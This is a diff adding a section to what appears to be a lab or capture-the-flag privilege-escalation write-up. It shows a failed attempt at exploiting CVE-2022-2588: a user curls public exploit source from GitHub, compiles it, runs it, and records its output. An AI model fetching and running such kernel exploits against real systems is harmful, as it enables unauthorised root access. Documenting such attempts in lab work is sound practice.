@@ -574,6 +574,29 @@ root@srv-99-590:/var/www/html#
 ```
 
 
-### Method 4 
+### Method 4  - CVE-2022-2588 (FAILED
+- I tried to exploit this cve however it failed as shown below
+
+```
+jennifer@srv-99-590:~$ curl https://raw.githubusercontent.com/Markakd/CVE-2022-2588/master/exp_file_credential.c > ex2.c
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 23935  100 23935    0     0  81581      0 --:--:-- --:--:-- --:--:-- 81411
+jennifer@srv-99-590:~$ man gcc
+jennifer@srv-99-590:~$ gcc -O0 ex2.c -lpthread -o ex2
+jennifer@srv-99-590:~$ ./ex2
+self path /home/jennifer/./ex2
+prepare done
+Old limits -> soft limit= 14096 	 hard limit= 14096
+starting exploit, num of cores: 1
+defrag done
+spray 256 done
+freed the filter object
+256 freed done
+double free done
+spraying files
+no overlap found :(...
+failed
+```
 
 
